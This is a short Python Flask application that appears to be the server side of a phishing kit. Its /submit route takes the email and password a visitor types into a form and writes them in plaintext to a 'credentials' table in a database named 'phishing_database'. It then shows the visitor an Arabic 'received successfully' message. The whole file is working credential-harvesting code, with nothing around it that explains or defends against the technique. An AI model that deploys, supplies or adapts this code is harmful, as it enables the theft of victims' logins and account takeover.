from flask import Flask, request
import mysql.connector
import os

app = Flask(__name__)

@app.route('/submit', methods=['POST'])
def submit():
    email = request.form.get('email')
    password = request.form.get('password')

    # Connect to MySQL using environment variables
    conn = mysql.connector.connect(
        host=os.getenv("DB_HOST", "mysql-service"),
        user=os.getenv("DB_USER", "demo"),
        password=os.getenv("DB_PASSWORD", "demo"),
        database=os.getenv("DB_NAME", "phishing_database")
    )
    cursor = conn.cursor()

    # Ensure the table exists
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS credentials (
            id INT AUTO_INCREMENT PRIMARY KEY,
            email VARCHAR(255),
            password VARCHAR(255)
        )
    """)

    # Insert credentials
    cursor.execute("INSERT INTO credentials (email, password) VALUES (%s, %s)", (email, password))
    conn.commit()

    cursor.close()
    conn.close()

    return "ﺖﻣ ﺍﻼﺴﺗﻼﻣ ﺐﻨﺟﺎﺣ"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)